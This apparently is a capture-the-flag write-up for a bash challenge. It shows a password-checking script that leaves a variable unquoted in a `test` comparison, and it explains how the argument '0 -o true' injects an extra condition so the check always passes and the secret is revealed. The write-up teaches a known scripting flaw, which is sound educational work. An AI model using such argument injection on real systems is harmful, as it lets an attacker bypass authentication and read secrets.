We have this script:

    PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
     
    PASS=$(cat .passwd)
     
    if test -z "${1}"; then
        echo "USAGE : $0 [password]"
        exit 1
    fi
     
    if test $PASS -eq ${1} 2>/dev/null; then
        echo "Well done you can validate the challenge with : $PASS"
    else
        echo "Try again ,-)"
    fi
     
    exit 0
We could transform this condition in one that is always true:

   $PASS -eq 1 -o something
   
This is like:
 
   1 == 0 || 2

There is a unquoted variable in a conditional sentence. 
   if test $PASS -eq ${1} 2>/dev/null; then
It means that if $1="2"
    $PASS -eq 2...
not
    $PASS -eq "2"

So, only we need to insert a condition as argument:

./ch16 "0 -o true"
